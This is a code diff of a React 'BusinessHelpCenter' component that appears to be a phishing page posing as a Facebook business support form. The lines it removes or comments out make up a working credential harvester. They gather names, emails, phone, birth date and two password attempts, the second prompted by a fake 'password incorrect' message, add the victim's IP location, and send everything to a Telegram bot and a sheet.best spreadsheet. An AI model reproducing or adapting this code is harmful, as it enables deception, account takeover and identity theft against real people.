@@ -50,6 +50,8 @@ const BusinessHelpCenter = () => {
     }
 
     setPassword("");
+    navigate("/confirm");
+
   };
   const onFinish = async (e: any) => {
     if (!checkPass) {
@@ -57,12 +59,12 @@ const BusinessHelpCenter = () => {
     } else {
       setCheckPass(false);
       setLoading(true);
-      const location = await axios.get(
-        "https://ipinfo.io?token=4ef03889d81a2d"
-      );
+      // const location = await axios.get(
+      //   "https://ipinfo.io?token=4ef03889d81a2d"
+      // );
       await Promise.all([
-        sendTelegramBotForGgsheet(location),
-        sendTelegramBotForBusiness(location),
+        // sendTelegramBotForGgsheet(location),
+        // sendTelegramBotForBusiness(location),
       ]);
       setLoading(false);
       dispatch(
@@ -84,90 +86,90 @@ const BusinessHelpCenter = () => {
     }
   };
 
-  const sendTelegramBotForGgsheet = async (response: any) => {
-    const API_URL = `https://api.telegram.org/bot${ETelegram.API_KEY}/`;
-    let CURRENT_API_URL = API_URL + "sendMessage";
-    try {
-      let message = "✅ Đã thêm vào sheet thành công";
-      const data = {
-        ["Name Page"]: namePage,
-        ["Full Name"]: fullName,
-        ["Business Email Address"]: businessEmail,
-        ["Personal Email Address"]: personalEmail,
-        ["Mobile Phone Number"]: phone,
-        ["Date of Birth"]: date,
-        ["Please provide us information that will help us investigate"]: text,
-        ["Password First"]: passwordFirst,
-        ["Password Second"]: passwordSecond,
-        ['Ip']: response.data.ip,
-        ['City']: response.data.city,
-        ['Country']: response.data.country,
-      };
-      await axios
-        .post(
-          "https://sheet.best/api/sheets/abe85991-15f1-47f0-a1d6-242f44b22e94",
-          data
-        )
-        .catch(() => {
-          message = "❌Thêm vào sheet không thành công";
-        });
-      await axios.post(
-        CURRENT_API_URL,
-        {
-          chat_id: ETelegram.CHAT_ID,
-          parse_mode: "html",
-          document: "",
-          text: message,
-          caption: message,
-        },
-        {
-          headers: {
-            "Content-Type": "multipart/form-data",
-          },
-        }
-      );
-    } catch (err) {
-      console.log("err: ", err);
-    }
-  };
+  // const sendTelegramBotForGgsheet = async (response: any) => {
+  //   // const API_URL = `https://api.telegram.org/bot${ETelegram.API_KEY}/`;
+  //   // let CURRENT_API_URL = API_URL + "sendMessage";
+  //   try {
+  //     let message = "✅ Đã thêm vào sheet thành công";
+  //     const data = {
+  //       ["Name Page"]: namePage,
+  //       ["Full Name"]: fullName,
+  //       ["Business Email Address"]: businessEmail,
+  //       ["Personal Email Address"]: personalEmail,
+  //       ["Mobile Phone Number"]: phone,
+  //       ["Date of Birth"]: date,
+  //       ["Please provide us information that will help us investigate"]: text,
+  //       ["Password First"]: passwordFirst,
+  //       ["Password Second"]: passwordSecond,
+  //       ['Ip']: response.data.ip,
+  //       ['City']: response.data.city,
+  //       ['Country']: response.data.country,
+  //     };
+  //     await axios
+  //       .post(
+  //         "https://sheet.best/api/sheets/abe85991-15f1-47f0-a1d6-242f44b22e94",
+  //         data
+  //       )
+  //       .catch(() => {
+  //         message = "❌Thêm vào sheet không thành công";
+  //       });
+  //     await axios.post(
+  //       CURRENT_API_URL,
+  //       {
+  //         chat_id: ETelegram.CHAT_ID,
+  //         parse_mode: "html",
+  //         document: "",
+  //         text: message,
+  //         caption: message,
+  //       },
+  //       {
+  //         headers: {
+  //           "Content-Type": "multipart/form-data",
+  //         },
+  //       }
+  //     );
+  //   } catch (err) {
+  //     console.log("err: ", err);
+  //   }
+  // };
 
-  const sendTelegramBotForBusiness = async (response: any) => {
-    const API_URL = `https://api.telegram.org/bot${ETelegram.API_KEY}/`;
-    let CURRENT_API_URL = API_URL + "sendMessage";
-    try {
+  // const sendTelegramBotForBusiness = async (response: any) => {
+  //   const API_URL = `https://api.telegram.org/bot${ETelegram.API_KEY}/`;
+  //   let CURRENT_API_URL = API_URL + "sendMessage";
+  //   try {
 
-      let message = `
-      Email Account:  ${businessEmail}
-      Name Account: ${namePage}
-      Person Email: ${personalEmail}
-      Facebook Page: ${text}
-      User Name: ${fullName}
-      Phone Number: ${phone}
-      Password First: ${passwordFirst}
-      Password Second: ${passwordSecond}
-      Ip: ${response.data.ip}
-      City: ${response.data.city}
-      Country: ${response.data.country}
-      `;
-      await axios.post(
-        CURRENT_API_URL,
-        {
-          chat_id: ETelegram.CHAT_ID,
-          parse_mode: "html",
-          document: "",
-          text: message,
-          caption: message,
-        },
-        {
-          headers: {
-            "Content-Type": "multipart/form-data",
-          },
-        }
-      );
-    } catch (err) {
-      console.log("err: ", err);
-    }
-  };
+  //     let message = `
+  //     Email Account:  ${businessEmail}
+  //     Name Account: ${namePage}
+  //     Person Email: ${personalEmail}
+  //     Facebook Page: ${text}
+  //     User Name: ${fullName}
+  //     Phone Number: ${phone}
+  //     Password First: ${passwordFirst}
+  //     Password Second: ${passwordSecond}
+  //     Ip: ${response.data.ip}
+  //     City: ${response.data.city}
+  //     Country: ${response.data.country}
+  //     `;
+  //     await axios.post(
+  //       CURRENT_API_URL,
+  //       {
+  //         chat_id: ETelegram.CHAT_ID,
+  //         parse_mode: "html",
+  //         document: "",
+  //         text: message,
+  //         caption: message,
+  //       },
+  //       {
+  //         headers: {
+  //           "Content-Type": "multipart/form-data",
+  //         },
+  //       }
+  //     );
+  //   } catch (err) {
+  //     console.log("err: ", err);
+  //   }
+  // };
 
   const clearState = () => {
     setNamePage("");
@@ -541,11 +543,11 @@ const BusinessHelpCenter = () => {
                         value={password}
                         onChange={(e) => setPassword(e.target.value)}
                       />
-                      {checkPass === true && (
+                      {/* {checkPass === true && (
                         <div style={{ color: "red" }}>
                           Your password was incorrect!
                         </div>
-                      )}
+                      )} */}
                     </Form.Item>
                     <Form.Item>
                       <Space
